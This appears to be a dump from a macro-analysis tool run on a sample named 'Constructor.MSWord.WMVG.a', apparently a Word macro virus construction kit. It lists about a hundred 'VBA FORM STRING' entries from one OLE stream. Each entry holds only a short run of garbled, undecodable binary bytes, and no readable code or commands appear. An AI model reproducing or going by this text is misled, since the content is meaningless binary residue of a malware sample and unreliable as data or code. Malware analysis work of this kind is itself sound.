VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4`��$��2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VV%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&�n^� �+�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�j��	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D��R5f����a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�9��kO��
䐗~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Պ��-V�q<	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qU<�&R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɫ\��TNM@8�J���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|>�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X���y/D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�䊼"b"��Pޙ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<-#3I$��IbV>�s���p�ڎ�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g����ׇ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��߅E\0;|+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��[L`i�)F�5j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�]�)����$ �\ ��ũ����¶���g?��N=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+h�x�݂��q'��¶�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v �'pv=�ҫ��Q��J� ���E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/��[�y<��R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(F�Ê�<�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j	�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aj�݇�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�3��OE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ċ�O��
�)�\�HM�Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�Ÿӷ\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ҍ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|[�"JҸ��;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��{`���������%N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�Q�Aܱ���Cj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ke�r�ھْ#�Q;�T�#�."�_s�IR�:~�V"���Xd�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*M;�V��j��uĔ�]��j*I��@���i*�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|��耵��A�)R�	a\U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gBA;�J��9*�iS��R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�s����F4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wz嘅�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fV�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��@$5+�푟�b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ԙ�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a+:�6���,H*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���g$pp~?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/@I�B�D`E���v�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>F0'�t(�&�T����rm�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�´��L�	���W���Z&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�zd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�����n*)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TWÕ:=Rɜ��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S�i��w��)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�HQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�&7ݨ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*WqZS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�dd@_k�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�^�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hdv��iL�E�
wZ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���IP�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�_lc1�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9s�ŧ�&��'rH	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2<�|)K`��Z���ѐ��Iqψ#å3#�=\��nR��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	z�ڕ
F�g�CI�y�E�I��%�n{����PG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BX��e�QDZ߭�ʤ�71�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�!=��DZe�Z��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�՚�1��3���b�Jd�ˋ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�B��z��K0�q�xyܪHi��"�~�NY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7[,"y%�~�=�=o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nB�����@tcD���u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mR-0��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��pb
j(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��`�a AS�4��l��=a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(E��Pӓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɁE��-nku���0$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\���L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5X��5d���`$��s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�⢻ד|9k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q0��ǩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܶHR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>c�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�>��6fU����f��cEW�4�FI�&/���۫
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v����3Gd�
't�V>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͒�1�/�c�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g1C��}.n:�l�l *
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ͯ�'�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҷ��O͚2Z���^-�zp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Rj�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%7#\��R�n,wR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U��R;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����1:za�6z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P58���~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
90
��Zj��zV��*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��z�NP2�Q^j�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fT��Z���,�b��"�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)J�I�,GP=�<+m�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�X����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[DG^[��sLim
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�E5#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_Z6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
܅�[w� �W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ㅀ�U�(<p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���+S_�炒��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�}�q�Nl���(P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?k�ND�Jw���(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�m�6�4�n g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^#��1!Bu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��푢��}@}�ڔ��F�j��J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r%Q �*p%Fe �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Y��iZӿ�X"�ɥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��*�ᇅx�Ku
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�؈��F�H.L�	��e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mM<[�&��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ʻ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J�+��
-------------------------------------------------------------------------------
